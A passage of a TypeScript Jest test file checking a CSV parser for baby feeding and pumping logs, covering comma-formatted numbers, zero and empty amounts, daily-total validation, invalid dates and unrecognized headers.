    it("handles comma-separated large numbers", () => {
      const csv = `Date,Feeding,Pump,Grand Total
10/19/2025,"1,234.56","2,345.67","3,580.23"`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const feedSession = result.sessions.find(s => s.session_type === "feeding");
      expect(feedSession!.amount_entered).toBe(1234.56);
    });

    it("skips zero amounts", () => {
      const csv = `Date,Feeding,Pump,Grand Total
10/19/2025,33.00,0,33.00`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions).toHaveLength(1); // Only feeding, pump is 0
      expect(result.feedCount).toBe(1);
      expect(result.pumpCount).toBe(0);
    });

    it("skips empty amounts", () => {
      const csv = `Date,Feeding,Pump,Grand Total
10/19/2025,33.00,,33.00`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions).toHaveLength(1); // Only feeding
      expect(result.feedCount).toBe(1);
      expect(result.pumpCount).toBe(0);
    });

    it("does NOT apply MAX_AMOUNT_ML validation (daily aggregates)", () => {
      const csv = `Date,Feeding,Pump,Grand Total
10/19/2025,33.00,34.50,67.50`;

      const result = parseFeedingPumpingCSV(csv);

      // 33 oz = ~976 ml, which exceeds MAX_AMOUNT_ML (500ml)
      // but pivot-daily format should NOT validate this (daily aggregates)
      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(2);
    });

    it("errors on invalid date", () => {
      const csv = `Date,Feeding,Pump,Grand Total
not-a-date,33.00,34.50,67.50`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("invalid date");
    });

    it("returns error for missing required columns", () => {
      // Has "Date" but missing "Feeding" and "Pump" — but still detected as pivot
      // because isPivotDailyHeaders checks for all three
      const csv = `Date,SomeCol,OtherCol,Total
10/19/2025,33.00,34.50,67.50`;

      const result = parseFeedingPumpingCSV(csv);

      // Should NOT be detected as pivot-daily (missing Feeding/Pump headers)
      // Falls through to unknown format
      expect(result.errors[0]).toContain("Unrecognized CSV format");
    });
  });
});
